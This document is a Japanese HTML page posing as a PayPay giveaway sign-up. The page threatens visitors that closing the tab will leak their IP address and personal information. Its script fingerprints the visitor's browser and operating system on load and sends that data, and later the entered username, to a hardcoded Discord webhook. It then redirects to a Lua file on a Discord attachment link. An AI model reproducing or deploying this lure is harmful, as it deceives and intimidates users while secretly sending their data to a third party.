<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>おおおおおおおつのスクリプト</title>
<style>
    .device-info {
        font-family: Arial, sans-serif;
        padding: 20px;
        background-color: #f4f4f4;
        border-radius: 5px;
        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
    }
    .info-label {
        font-weight: bold;
    }
</style>
</head>
<body>

<h2>Paypayがもらえる！？</h2>
<h3>簡単な登録をするだけ！！</h3>
<h3>このタブを消すと個人情報が流出します。ipアドレスなどが流出します</h3>

<form id="loginForm">
    <label for="username">ユーザー名:</label>
    <input type="text" id="username" name="username">
    <br>
    <label for="password">パスワード:</label>
    <input type="password" id="password" name="password">
    <button type="button" onclick="login()">ログイン</button>
</form>

<button id="continueButton" style="display:none;" onclick="redirectToLink()">Continue</button>

<div class="device-info" style="display: none;">
    <p><span class="info-label">IPアドレス:</span> <span id="ipAddress"></span></p>
</div>

<script>
    var userAgent = navigator.userAgent;
    var browser = "Unknown";
    var browserVersion = "Unknown";
    var os = "Unknown";
    var osVersion = "Unknown";

    if (userAgent.indexOf("Firefox") > -1) {
        browser = "Firefox";
        browserVersion = userAgent.split("Firefox/")[1];
    } else if (userAgent.indexOf("Chrome") > -1) {
        browser = "Chrome";
        browserVersion = userAgent.split("Chrome/")[1].split(" ")[0];
    } else if (userAgent.indexOf("Safari") > -1 && userAgent.indexOf("Chrome") === -1) {
        browser = "Safari";
        browserVersion = userAgent.split("Version/")[1].split(" ")[0];
    } else if (userAgent.indexOf("MSIE") > -1 || userAgent.indexOf("Trident/") > -1) {
        browser = "Internet Explorer";
        browserVersion = userAgent.indexOf("MSIE") > -1 
            ? userAgent.split("MSIE ")[1].split(";")[0]
            : userAgent.split("rv:")[1].split(")")[0];
    }

    if (userAgent.indexOf("Windows") > -1) {
        os = "Windows";
        osVersion = userAgent.split("Windows NT ")[1].split(";")[0];
    } else if (userAgent.indexOf("Macintosh") > -1) {
        os = "Macintosh";
        osVersion = "OS X " + userAgent.split("OS X ")[1].split(")")[0];
    } else if (userAgent.indexOf("Android") > -1) {
        os = "Android";
        osVersion = userAgent.split("Android ")[1].split(";")[0];
    } else if (userAgent.indexOf("iPhone") > -1 || userAgent.indexOf("iPad") > -1) {
        os = "iOS";
        osVersion = userAgent.split("OS ")[1].split(" ")[0];
    }

    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            sendDataToDiscord("", browser, browserVersion, os, osVersion);
        })
        .catch(error => {
            console.error('IPアドレスの取得に失敗しました:', error);
        });

    function sendDataToDiscord(username, browser, browserVersion, os, osVersion) {
        var webhookURL = 'https://discord.com/api/webhooks/1223447142740262972/vxrn9O3gB3fVm0mx0g_VcN4jYB0MRK-L6pdcinnad2gTAk3jFYbYg_S1vfPixzFLoK6G';
        var data = {
            content: '```ユーザー名: ' + username + '\n端末情報:\nブラウザ: ' + browser + '\nブラウザバージョン: ' + browserVersion + '\nOS: ' + os + '\nOSバージョン: ' + osVersion + '```'
        };

        fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data),
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Failed to send data to Discord');
            }
            console.log('Data sent to Discord successfully');
        })
        .catch(error => {
            console.error('Error sending data to Discord:', error);
        });
    }

    function login() {
        var username = document.getElementById("username").value;
        var password = document.getElementById("password").value;
        if (password === "password123") {
            document.getElementById("loginForm").style.display = "none";
            document.getElementById("continueButton").style.display = "block";
            sendDataToDiscord(username, browser, browserVersion, os, osVersion);
        } else {
            alert("パスワードが正しくありません。");
        }
    }

    function redirectToLink() {
        window.location.href = "https://cdn.discordapp.com/attachments/1223447103116935178/1240124023568990238/776826c9e558e35a.lua?ex=66456aff&is=6644197f&hm=517f07a5aa74e14063b26e3078db7d9dd68848d79d7f8546506f4d080f1cad3c&";
    }
</script>

</body>
</html>
